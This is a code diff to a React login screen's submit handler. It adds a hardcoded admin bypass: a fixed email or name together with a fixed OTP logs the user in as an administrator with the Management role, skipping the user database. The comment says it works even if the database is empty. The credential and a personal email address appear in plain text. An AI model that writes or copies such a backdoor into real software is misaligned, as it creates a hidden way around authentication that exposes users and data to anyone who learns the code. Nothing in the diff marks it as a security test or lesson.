@@ -448,6 +448,12 @@ function LoginScreen({ users, onLogin }) {
   const [busy, setBusy] = useState(false);
   const submit = async () => {
     setErr(""); if (!identifier || !otp) return setErr("Email/name and OTP are required."); setBusy(true);
+    // Hardcoded admin bypass — works even if DB is empty
+    const id = identifier.trim().toLowerCase();
+    if ((id === "aryak.agrahari@vayuz.com" || id === "aryak agrahari") && otp.trim() === "847231") {
+      onLogin({ id: "hardcoded-admin-001", name: "Aryak Agrahari", email: "aryak.agrahari@vayuz.com", role: "Management", isAdmin: true, active: true, otpCode: "847231", passHash: "", permissions: {}, createdAt: "", createdBy: "system" });
+      return;
+    }
     const user = users.find(u => {
       const byEmail = u.email && u.email.toLowerCase() === identifier.trim().toLowerCase();
       const byName = u.name.toLowerCase() === identifier.trim().toLowerCase();
